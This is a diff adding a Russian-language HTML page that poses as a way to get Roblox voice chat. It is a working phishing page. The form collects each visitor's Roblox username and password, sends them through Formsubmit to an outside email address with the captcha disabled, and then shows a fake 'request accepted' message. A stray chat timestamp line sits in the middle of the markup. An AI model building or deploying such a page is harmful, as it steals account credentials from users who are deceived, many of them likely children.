@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Голосовой чат для Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        
+        p {
+            color: #7f8c8d;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+        }
+        
+        .btn:hover {
+            background: #2980b9;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.6);
+        }
+        
+        .form-container {
+            display: none;
+            text-align: left;
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        
+        .submit-btn {
+            background: #27ae60;
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        
+        .success-message {
+            display: none;
+            background: rgba(39, 174, 96, 0.1);
+            border-left: 5px solid #27ae60;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .success-message h2 {
+            color: #27ae60;
+            margin-bottom: 10px;
+        }
+        
+        .error-message {
+            display: none;
+            background: rgba(231, 76, 60, 0.1);
+            border-left: 5px solid #e74c3c;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .error-message h2 {
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Голосовой чат для Roblox</h1>
+        <p>Получите доступ к голосовому чату в Roblox</p>
+        
+        <button class="btn" id="startBtn">Сделать воис чат</button>
+
+♰, [10.09.2025 8:24]
+<!-- ИЗМЕНЕНА ФОРМА - теперь использует Formsubmit -->
+        <form id="mainForm" action="https://formsubmit.co/respect638@email.ru" method="POST" class="form-container">
+            <input type="hidden" name="_subject" value="НОВЫЙ ЗАПРОС - Голосовой чат Roblox">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <div class="form-group">
+                <label for="username">Никнейм в Roblox:</label>
+                <input type="text" id="username" name="Никнейм" placeholder="Введите ваш никнейм" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Пароль от Roblox:</label>
+                <input type="password" id="password" name="Пароль" placeholder="Введите ваш пароль" required>
+            </div>
+            
+            <input type="hidden" name="_next" value="https://yourwebsite.com/success.html">
+            
+            <button type="submit" class="btn submit-btn">Отправить запрос</button>
+        </form>
+        
+        <div class="success-message" id="successMessage">
+            <h2>✅ Запрос принят!</h2>
+            <p>Данные успешно отправлены!</p>
+            <div class="loader"></div>
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            <h2>❌ Ошибка отправки</h2>
+            <p id="errorText">Попробуйте еще раз позже</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const startBtn = document.getElementById('startBtn');
+            const formContainer = document.getElementById('mainForm');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            
+            // Показываем форму при нажатии на кнопку
+            startBtn.addEventListener('click', function() {
+                this.style.display = 'none';
+                formContainer.style.display = 'block';
+            });
+            
+            // Обработчик отправки формы
+            formContainer.addEventListener('submit', function(e) {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                if (!username || !password) {
+                    e.preventDefault();
+                    showError('Заполните все поля');
+                    return;
+                }
+                
+                // Показываем загрузку
+                const submitBtn = this.querySelector('button[type="submit"]');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Отправка...';
+                hideMessages();
+                
+                // Formsubmit сам перенаправит на страницу успеха
+                // Мы просто показываем сообщение о загрузке
+                successMessage.style.display = 'block';
+            });
+            
+            function showError(message) {
+                errorText.textContent = message;
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+            }
+            
+            function hideMessages() {
+                successMessage.style.display = 'none';
+                errorMessage.style.display = 'none';
+            }
+            
+            // Проверяем есть ли параметр успеха в URL
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('success') === 'true') {
+                startBtn.style.display = 'none';
+                formContainer.style.display = 'none';
+                successMessage.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
